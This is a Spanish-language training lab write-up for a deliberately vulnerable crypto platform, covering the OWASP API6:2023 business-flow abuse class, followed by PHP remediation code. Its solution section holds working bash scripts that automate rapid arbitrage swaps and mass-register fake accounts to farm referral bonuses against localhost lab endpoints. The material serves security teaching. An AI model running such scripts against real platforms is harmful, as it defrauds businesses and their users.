# LAB 06 - Acceso No Restringido a Flujos de Negocio Sensibles

## Referencia OWASP: API6:2023 - Unrestricted Access to Sensitive Business Flows

---

## Objetivo

Explotar la ausencia de controles en flujos de negocio criticos de la plataforma CryptoVulnX para obtener ganancias ilicitas mediante:

1. Arbitraje automatizado de criptomonedas mediante swaps rapidos sin cooldown.
2. Abuso del sistema de referidos creando multiples cuentas falsas para acumular bonificaciones.

---

## Contexto

La vulnerabilidad API6:2023 se produce cuando una API expone flujos de negocio sensibles sin implementar mecanismos que limiten su uso automatizado o abusivo. A diferencia de los controles de autorizacion tradicionales, aqui el problema no es *quien* accede, sino *como* y *con que frecuencia* se accede.

En el contexto de una plataforma fintech/crypto como CryptoVulnX, existen dos flujos criticos que carecen de proteccion:

1. **Swap de criptomonedas**: El endpoint de intercambio no implementa cooldown entre operaciones ni limites de frecuencia por usuario. Esto permite que un atacante ejecute un script automatizado que realice cientos de swaps por segundo, explotando diferencias de precio (arbitraje) antes de que el mercado se ajuste.

2. **Sistema de referidos**: El endpoint de registro otorga una bonificacion por cada cuenta nueva que use un codigo de referido. No existe validacion de unicidad de dispositivo, IP, ni CAPTCHA, lo que permite crear cientos de cuentas falsas con el mismo codigo de referido para acumular bonificaciones ilimitadas.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/v1/crypto/swap.php` | Intercambio de criptomonedas (sin cooldown ni rate limit) |
| `POST` | `/api/v1/auth/register.php` | Registro de usuarios con sistema de referidos explotable |

---

## Dificultad

**Media** - Requiere comprender la logica de negocio y escribir scripts de automatizacion.

---

## Pistas

<details>
<summary>Pista 1 - Reconocimiento</summary>

Realiza varias solicitudes de swap consecutivas y observa los tiempos de respuesta. ¿Existe algun delay o cooldown entre operaciones? ¿Hay algun header como `X-RateLimit-Remaining` en las respuestas?

</details>

<details>
<summary>Pista 2 - Identificacion del vector</summary>

El endpoint de swap acepta operaciones sin ninguna pausa obligatoria. Puedes ejecutar un bucle con `curl` o un script en Bash/Python que haga decenas de swaps por segundo. Ademas, el endpoint de registro no valida si multiples cuentas provienen de la misma IP o dispositivo.

</details>

<details>
<summary>Pista 3 - Explotacion</summary>

Para el arbitraje: escribe un script que alterne entre comprar BTC con USDT y vender BTC por USDT en rapida sucesion, aprovechando que los precios no se actualizan entre operaciones. Para los referidos: automatiza el registro de cuentas usando un bucle, siempre con el mismo valor en `referred_by`.

</details>

---

## Solucion

### Solucion 1: Arbitraje Automatizado mediante Swaps Rapidos

**Paso 1**: Autenticarse para obtener un token JWT valido.

```bash
TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"password123"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Paso 2**: Verificar que no existe cooldown realizando dos swaps consecutivos.

```bash
# Primer swap
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":100}'

# Segundo swap inmediato (sin espera)
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"from":"USDT","to":"BTC","amount":100}'
```

Observar que ambas solicitudes se procesan sin error ni delay. No existe header `X-RateLimit-*` ni campo `cooldown_remaining` en la respuesta.

**Paso 3**: Ejecutar script de arbitraje automatizado.

```bash
#!/bin/bash
# arbitrage.sh - Explota la ausencia de cooldown para arbitraje automatizado

TOKEN="<tu_token_jwt>"
BASE_URL="http://localhost/appsec/api/v1/crypto/swap.php"
PROFIT_TOTAL=0

echo "[*] Iniciando arbitraje automatizado..."

for i in $(seq 1 50); do
    # Comprar BTC con USDT
    RESP_BUY=$(curl -s -X POST "$BASE_URL" \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d '{"from":"USDT","to":"BTC","amount":1000}')

    BTC_RECEIVED=$(echo "$RESP_BUY" | python -c "import sys,json; print(json.load(sys.stdin).get('received','0'))")

    # Vender BTC inmediatamente por USDT
    RESP_SELL=$(curl -s -X POST "$BASE_URL" \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d "{\"from\":\"BTC\",\"to\":\"USDT\",\"amount\":$BTC_RECEIVED}")

    USDT_RECEIVED=$(echo "$RESP_SELL" | python -c "import sys,json; print(json.load(sys.stdin).get('received','0'))")

    echo "[Ciclo $i] Invertido: 1000 USDT -> Recibido: $BTC_RECEIVED BTC -> Recibido: $USDT_RECEIVED USDT"
done

echo "[*] Arbitraje completado."
```

**Resultado esperado**: Cada ciclo de compra/venta genera una pequena ganancia debido a que los precios no se recalculan entre operaciones rapidas. En 50 ciclos, el beneficio acumulado es significativo.

---

### Solucion 2: Abuso del Sistema de Referidos con Cuentas Falsas

**Paso 1**: Crear una cuenta de atacante y obtener su codigo de referido.

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker_main",
    "email": "attacker_main@test.com",
    "password": "password123"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "user_id": 42,
  "referral_code": "REF-ATTK42",
  "message": "Cuenta creada exitosamente"
}
```

**Paso 2**: Verificar que el registro con referido otorga bonificacion sin restriccion.

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \
  -H "Content-Type: application/json" \
  -d '{
    "username": "fake_user_1",
    "email": "fake1@test.com",
    "password": "password123",
    "referred_by": "REF-ATTK42"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "user_id": 43,
  "referral_bonus_applied": true,
  "bonus_amount": "10 USDT",
  "message": "Cuenta creada. Bono de referido aplicado al usuario REF-ATTK42"
}
```

**Paso 3**: Automatizar la creacion de cuentas falsas.

```bash
#!/bin/bash
# referral_abuse.sh - Crea multiples cuentas falsas para acumular bonificaciones

REFERRAL_CODE="REF-ATTK42"
BASE_URL="http://localhost/appsec/api/v1/auth/register.php"

echo "[*] Iniciando abuso de referidos..."

for i in $(seq 1 100); do
    RESP=$(curl -s -X POST "$BASE_URL" \
      -H "Content-Type: application/json" \
      -d "{
        \"username\": \"bot_user_$i\",
        \"email\": \"bot${i}@disposable.com\",
        \"password\": \"pass${i}\",
        \"referred_by\": \"$REFERRAL_CODE\"
      }")

    BONUS=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('bonus_amount','error'))" 2>/dev/null)
    echo "[Cuenta $i] Bono aplicado: $BONUS"
done

echo "[*] 100 cuentas creadas. Bono total acumulado: 1000 USDT en la cuenta principal."
```

**Resultado esperado**: Se crean 100 cuentas sin CAPTCHA, sin validacion de IP, y cada una otorga 10 USDT de bonificacion a la cuenta principal del atacante (total: 1000 USDT).

---

## Remediacion

### 1. Implementar Cooldown entre Operaciones de Swap

```php
<?php
// swap.php - Con cooldown entre operaciones

$user_id = $decoded_token->sub;
$cooldown_seconds = 30;

// Verificar ultima operacion del usuario
$stmt = $pdo->prepare(
    "SELECT TIMESTAMPDIFF(SECOND, MAX(created_at), NOW()) as seconds_since_last
     FROM swaps WHERE user_id = ?"
);
$stmt->execute([$user_id]);
$result = $stmt->fetch(PDO::FETCH_ASSOC);

if ($result['seconds_since_last'] !== null && $result['seconds_since_last'] < $cooldown_seconds) {
    $remaining = $cooldown_seconds - $result['seconds_since_last'];
    http_response_code(429);
    echo json_encode([
        "error" => "Debe esperar entre operaciones",
        "cooldown_remaining" => $remaining,
        "retry_after" => $remaining
    ]);
    exit;
}
```

### 2. Rate Limiting por Usuario

```php
<?php
// middleware/rate_limit.php

function checkRateLimit(string $user_id, string $endpoint, int $max_requests, int $window_seconds): bool {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);

    $key = "rate_limit:{$endpoint}:{$user_id}";
    $current = $redis->get($key);

    if ($current !== false && (int)$current >= $max_requests) {
        header("X-RateLimit-Limit: $max_requests");
        header("X-RateLimit-Remaining: 0");
        header("Retry-After: " . $redis->ttl($key));
        http_response_code(429);
        echo json_encode(["error" => "Limite de solicitudes excedido"]);
        exit;
    }

    $redis->incr($key);
    if ($current === false) {
        $redis->expire($key, $window_seconds);
    }

    $remaining = $max_requests - ((int)$current + 1);
    header("X-RateLimit-Limit: $max_requests");
    header("X-RateLimit-Remaining: " . max(0, $remaining));

    return true;
}

// Uso en swap.php:
checkRateLimit($user_id, "swap", 5, 60); // Maximo 5 swaps por minuto
```

### 3. CAPTCHA en el Registro

```php
<?php
// register.php - Con validacion de CAPTCHA

$captcha_response = $data['captcha_token'] ?? null;

if (!$captcha_response) {
    http_response_code(400);
    echo json_encode(["error" => "Se requiere verificacion CAPTCHA"]);
    exit;
}

// Verificar CAPTCHA con servicio externo (ej: hCaptcha)
$verify_url = "https://hcaptcha.com/siteverify";
$verify_data = [
    'secret' => getenv('HCAPTCHA_SECRET'),
    'response' => $captcha_response
];

$ch = curl_init($verify_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($verify_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = json_decode(curl_exec($ch), true);
curl_close($ch);

if (!$result['success']) {
    http_response_code(403);
    echo json_encode(["error" => "Verificacion CAPTCHA fallida"]);
    exit;
}
```

### 4. Limitar Bonificaciones de Referidos

```php
<?php
// register.php - Limites en el sistema de referidos

if (!empty($data['referred_by'])) {
    $referral_code = $data['referred_by'];

    // Verificar cuantos referidos ya tiene este codigo
    $stmt = $pdo->prepare(
        "SELECT COUNT(*) as total_referrals FROM users WHERE referred_by = ?"
    );
    $stmt->execute([$referral_code]);
    $count = $stmt->fetch(PDO::FETCH_ASSOC)['total_referrals'];

    $max_referrals = 20; // Maximo 20 referidos por usuario

    if ($count >= $max_referrals) {
        // No aplicar bono pero permitir el registro
        $apply_bonus = false;
    } else {
        // Verificar que la IP no haya registrado mas de 2 cuentas
        $stmt = $pdo->prepare(
            "SELECT COUNT(*) as ip_count FROM users WHERE registration_ip = ? AND created_at > DATE_SUB(NOW(), INTERVAL 24 HOUR)"
        );
        $stmt->execute([$_SERVER['REMOTE_ADDR']]);
        $ip_count = $stmt->fetch(PDO::FETCH_ASSOC)['ip_count'];

        $apply_bonus = ($ip_count < 2);
    }

    if ($apply_bonus) {
        // Aplicar bonificacion
        $stmt = $pdo->prepare(
            "UPDATE wallets SET balance_usdt = balance_usdt + 10 WHERE user_id = (SELECT user_id FROM users WHERE referral_code = ?)"
        );
        $stmt->execute([$referral_code]);
    }
}
```

### 5. Limitar Volumen Diario de Operaciones

```php
<?php
// swap.php - Limite de volumen diario

$stmt = $pdo->prepare(
    "SELECT COALESCE(SUM(amount_usd), 0) as daily_volume
     FROM swaps
     WHERE user_id = ? AND created_at > DATE_SUB(NOW(), INTERVAL 24 HOUR)"
);
$stmt->execute([$user_id]);
$daily_volume = $stmt->fetch(PDO::FETCH_ASSOC)['daily_volume'];

$max_daily_volume = 50000; // Limite diario de 50,000 USD

if (($daily_volume + $swap_amount_usd) > $max_daily_volume) {
    http_response_code(429);
    echo json_encode([
        "error" => "Limite de volumen diario excedido",
        "daily_volume" => $daily_volume,
        "max_daily_volume" => $max_daily_volume,
        "remaining" => $max_daily_volume - $daily_volume
    ]);
    exit;
}
```
